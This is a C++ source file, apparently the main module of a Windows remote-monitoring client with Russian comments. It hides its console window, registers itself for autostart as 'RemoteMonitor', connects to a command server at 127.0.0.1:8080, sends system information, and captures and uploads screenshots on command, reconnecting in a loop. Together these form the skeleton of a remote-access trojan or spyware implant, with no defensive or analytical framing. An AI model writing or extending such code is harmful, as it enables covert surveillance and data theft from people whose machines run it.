#include "NetworkManager.h"
#include "SystemInfo.h"
#include "ScreenshotManager.h"
#include "AutoStartManager.h"
#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>

// Глобальные переменные
NetworkManager network;
ScreenshotManager screenshot;
bool isRunning = true;

// Функция для обработки команд от сервера
void HandleServerCommands() {
    char buffer[1024];
    int bytesReceived;

    while (isRunning) {
        if (network.ReceiveData(buffer, sizeof(buffer), bytesReceived)) {
            std::string command(buffer, bytesReceived);
            
            if (command == "SCREENSHOT") {
                screenshot.SendScreenshot(network);
            }
            else if (command == "SYSTEM_INFO") {
                network.SendData(SystemInfo::GetAllSystemInfo());
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Скрываем консольное окно
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Добавляем в автозапуск
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    AutoStartManager::AddToStartup("RemoteMonitor", exePath);

    // Подключаемся к серверу
    if (!network.Connect("127.0.0.1", 8080)) {
        return 1;
    }

    // Отправляем начальную информацию о системе
    network.SendData(SystemInfo::GetAllSystemInfo());

    // Запускаем поток обработки команд
    std::thread commandThread(HandleServerCommands);

    // Основной цикл
    while (isRunning) {
        if (!network.IsConnected()) {
            // Пытаемся переподключиться
            if (!network.Connect("127.0.0.1", 8080)) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
                continue;
            }
            // Отправляем информацию о системе после переподключения
            network.SendData(SystemInfo::GetAllSystemInfo());
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    commandThread.join();
    return 0;
} 